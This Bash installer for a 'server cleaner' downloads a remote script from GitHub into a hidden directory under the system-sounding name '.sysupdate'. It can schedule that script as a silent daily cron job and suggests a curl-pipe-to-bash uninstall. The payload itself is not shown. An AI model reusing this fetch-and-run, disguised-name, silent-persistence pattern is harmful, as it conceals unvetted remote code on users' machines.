#!/bin/bash

set -e

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

SCRIPT_VERSION="1.0.0"
HIDDEN_DIR="$HOME/.cache/system"
SCRIPT_NAME=".sysupdate"
SCRIPT_PATH="$HIDDEN_DIR/$SCRIPT_NAME"
SCRIPT_URL="https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh"

# Параметры по умолчанию
AUTO_CRON=false
AUTO_RUN=false
SILENT=false

# Парсинг аргументов
while [[ $# -gt 0 ]]; do
    case $1 in
        --auto-cron)
            AUTO_CRON=true
            shift
            ;;
        --auto-run)
            AUTO_RUN=true
            shift
            ;;
        --silent)
            SILENT=true
            shift
            ;;
        --help)
            echo "Usage: $0 [OPTIONS]"
            echo "Options:"
            echo "  --auto-cron    Automatically add to crontab without asking"
            echo "  --auto-run     Automatically run cleaning script after install"
            echo "  --silent       Run without prompts (implies --auto-cron)"
            echo "  --help         Show this help message"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Если silent режим, включаем авто-cron
if [ "$SILENT" = true ]; then
    AUTO_CRON=true
fi

# Функция вывода сообщений
log_info() { 
    if [ "$SILENT" = false ]; then
        echo -e "${GREEN}[INFO]${NC} $1"
    fi
}
log_warn() { 
    if [ "$SILENT" = false ]; then
        echo -e "${YELLOW}[WARN]${NC} $1"
    fi
}
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Проверка root прав
check_root() {
    if [ "$EUID" -ne 0 ]; then
        log_warn "Some operations require root. Run with sudo for full functionality."
        return 1
    fi
    return 0
}

# Проверка и установка зависимостей
install_dependencies() {
    local missing_deps=()
    
    if ! command -v curl &> /dev/null && ! command -v wget &> /dev/null; then
        missing_deps+=("curl")
    fi
    
    if ! command -v crontab &> /dev/null; then
        missing_deps+=("cron")
    fi
    
    if [ ${#missing_deps[@]} -eq 0 ]; then
        log_info "All dependencies satisfied"
        return 0
    fi
    
    log_warn "Missing dependencies: ${missing_deps[*]}"
    
    if ! check_root; then
        log_error "Root access required to install dependencies"
        log_info "Please run: sudo $0"
        exit 1
    fi
    
    if command -v apt-get &> /dev/null; then
        log_info "Installing via apt-get..."
        apt-get update -qq
        for dep in "${missing_deps[@]}"; do
            if [ "$dep" = "cron" ]; then
                apt-get install -y cron
                systemctl enable cron 2>/dev/null || true
                systemctl start cron 2>/dev/null || true
            else
                apt-get install -y "$dep"
            fi
        done
    elif command -v yum &> /dev/null; then
        log_info "Installing via yum..."
        for dep in "${missing_deps[@]}"; do
            if [ "$dep" = "cron" ]; then
                yum install -y cronie
                systemctl enable crond 2>/dev/null || true
                systemctl start crond 2>/dev/null || true
            else
                yum install -y "$dep"
            fi
        done
    elif command -v dnf &> /dev/null; then
        log_info "Installing via dnf..."
        for dep in "${missing_deps[@]}"; do
            if [ "$dep" = "cron" ]; then
                dnf install -y cronie
                systemctl enable crond 2>/dev/null || true
                systemctl start crond 2>/dev/null || true
            else
                dnf install -y "$dep"
            fi
        done
    elif command -v pacman &> /dev/null; then
        log_info "Installing via pacman..."
        for dep in "${missing_deps[@]}"; do
            pacman -S --noconfirm "$dep"
        done
    else
        log_error "Unknown package manager. Please install manually: ${missing_deps[*]}"
        exit 1
    fi
    
    log_info "Dependencies installed successfully"
}

# Создание директории
create_directory() {
    if [ -d "$HIDDEN_DIR" ]; then
        log_info "Directory already exists: $HIDDEN_DIR"
    else
        mkdir -p "$HIDDEN_DIR" 2>/dev/null || {
            log_error "Failed to create directory: $HIDDEN_DIR"
            exit 1
        }
        log_info "Created directory: $HIDDEN_DIR"
    fi
}

# Скачивание скрипта
download_script() {
    log_info "Downloading cleaning script..."
    
    if command -v curl &> /dev/null; then
        if curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH" 2>/dev/null; then
            log_info "Downloaded via curl"
            return 0
        else
            log_warn "curl failed, trying wget..."
        fi
    fi
    
    if command -v wget &> /dev/null; then
        if wget -qO "$SCRIPT_PATH" "$SCRIPT_URL" 2>/dev/null; then
            log_info "Downloaded via wget"
            return 0
        else
            log_error "wget failed"
        fi
    fi
    
    log_error "Failed to download script from $SCRIPT_URL"
    exit 1
}

# Установка прав
set_permissions() {
    chmod +x "$SCRIPT_PATH" 2>/dev/null || {
        log_error "Failed to set execute permission"
        exit 1
    }
    log_info "Set execute permissions"
}

# Настройка crontab
setup_cron() {
    if ! command -v crontab &> /dev/null; then
        log_warn "crontab not available, skipping automatic scheduling"
        return 1
    fi
    
    if crontab -l 2>/dev/null | grep -qF "$SCRIPT_PATH"; then
        log_info "Already scheduled in crontab"
        return 0
    fi
    
    # Автоматическое добавление или запрос подтверждения
    if [ "$AUTO_CRON" = true ]; then
        (crontab -l 2>/dev/null; echo "0 0 * * * /bin/bash $SCRIPT_PATH >/dev/null 2>&1") | crontab - 2>/dev/null || {
            log_error "Failed to add to crontab"
            return 1
        }
        log_info "Scheduled daily cleaning at 00:00"
    else
        echo ""
        read -p "Schedule automatic cleaning daily at 00:00? (y/n): " -n 1 -r
        echo
        
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            (crontab -l 2>/dev/null; echo "0 0 * * * /bin/bash $SCRIPT_PATH >/dev/null 2>&1") | crontab - 2>/dev/null || {
                log_error "Failed to add to crontab"
                return 1
            }
            log_info "Scheduled daily cleaning at 00:00"
        else
            log_info "Skipped automatic scheduling"
        fi
    fi
}

# Проверка установки
verify_installation() {
    if [ ! -f "$SCRIPT_PATH" ]; then
        log_error "Script file not found after installation"
        return 1
    fi
    
    if [ ! -x "$SCRIPT_PATH" ]; then
        log_error "Script is not executable"
        return 1
    fi
    
    log_info "Installation verified"
    return 0
}

# Запуск скрипта сейчас
run_now() {
    if [ "$AUTO_RUN" = true ]; then
        log_info "Running cleaning script..."
        bash "$SCRIPT_PATH" 2>/dev/null || log_warn "Cleanup failed"
        log_info "Done"
    elif [ "$SILENT" = false ]; then
        echo ""
        read -p "Run cleaning now? (y/n): " -n 1 -r
        echo
        
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            log_info "Running cleaning script..."
            bash "$SCRIPT_PATH"
            log_info "Done"
        fi
    fi
}

# Основная функция
main() {
    if [ "$SILENT" = false ]; then
        echo "======================================"
        echo "  Server Cleaner Installer v${SCRIPT_VERSION}"
        echo "======================================"
        echo ""
    fi
    
    check_root || log_warn "Running without root - some features may not work"
    
    log_info "Checking dependencies..."
    install_dependencies
    
    log_info "Setting up installation..."
    create_directory
    download_script
    set_permissions
    
    if verify_installation; then
        log_info "Installation successful!"
        
        if [ "$SILENT" = false ]; then
            echo ""
            echo "Location: $SCRIPT_PATH"
            echo "Manual run: bash $SCRIPT_PATH"
            echo ""
        fi
        
        setup_cron
        run_now
        
        if [ "$SILENT" = false ]; then
            echo ""
            log_info "To uninstall: curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/uninstall.sh | bash"
        fi
    else
        log_error "Installation failed"
        exit 1
    fi
}

main
